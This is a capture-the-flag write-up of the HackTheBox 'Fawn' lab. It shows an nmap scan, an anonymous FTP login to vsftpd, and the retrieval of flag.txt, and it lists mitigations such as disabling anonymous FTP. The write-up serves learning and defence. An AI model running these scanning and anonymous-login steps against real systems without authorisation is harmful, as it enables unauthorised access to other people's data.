# Fawn - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Fawn |
| OS | Linux |
| Difficulty | Very Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-21 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Fawn is a Starting Point machine that demonstrates insecure FTP configuration. A basic service scan identified FTP on port 21, and anonymous authentication provided direct access to a flag file. The machine was solved by logging in anonymously and downloading `flag.txt`.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV TARGET_IP
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd |

### Analysis

FTP was the only exposed service. This often indicates weak access controls, especially when anonymous login is enabled.

---

## Enumeration

The FTP service accepted anonymous credentials.

```bash
ftp TARGET_IP
Username: anonymous
Password: anonymous
```

Login succeeded and directory listing revealed a flag file.

```bash
ls
```

Output:

```text
flag.txt
```

---

## Exploitation

### Vulnerability

**Category:** Misconfiguration - Anonymous FTP Login

**Description:**
The FTP server allowed unauthenticated user access through the anonymous account, exposing sensitive files.

### Proof of Concept

```bash
ftp TARGET_IP
# login as anonymous
get flag.txt
cat flag.txt
```

This provided direct access to the flag without valid user credentials.

---

## Post-Exploitation / Privilege Escalation

No privilege escalation was required for this machine.

---

## Flags

| Flag | Hash |
|------|------|
| User flag | Retrieved from `flag.txt` |
| Root flag | N/A |

---

## Key Takeaways

- What I learned: Anonymous services can expose sensitive data even without code execution.
- Techniques used: Service scanning, anonymous FTP enumeration.
- Tools used: Nmap, FTP client.
- Mitigations: Disable anonymous FTP, restrict file permissions, and prefer secure protocols like SFTP.

---

## References

- https://app.hackthebox.com
- https://owasp.org/www-project-top-ten/
